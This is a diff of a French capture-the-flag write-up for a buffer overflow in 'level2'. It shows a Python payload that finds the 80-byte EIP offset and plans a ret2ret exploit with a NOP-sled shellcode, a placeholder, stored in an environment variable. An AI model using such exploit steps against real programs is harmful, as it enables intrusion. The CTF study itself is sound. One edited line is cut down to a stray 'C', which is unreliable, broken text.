@@ -46,8 +46,8 @@ Il y a un check pour empêcher les retours vers la stack (0xbxxxxxxx).
 On trouve que l'EIP est à 80 octets :
 
 ```bash
-$ python -c 'print "A"*80 + "BBBB"' > payload
-$ ./level2 < payload
+$ python3 -c 'print("A"*80 + "BBBB")' | ./level2
+
 # Crash avec EIP = 0x42424242 (BBBB)
 ```
 
@@ -59,7 +59,7 @@ On ne peut pas retourner vers un shellcode dans la stack à cause du test 0xb000
 
 ### Solution : ret2ret + shellcode en variable d'environnement
 
-Créer un shellcode avec NOP sled dans une variable d'env :
+C
 
 ```bash
 env -i exploit=$(python -c 'print "\x90"*1000 + "<shellcode>"') ./level2
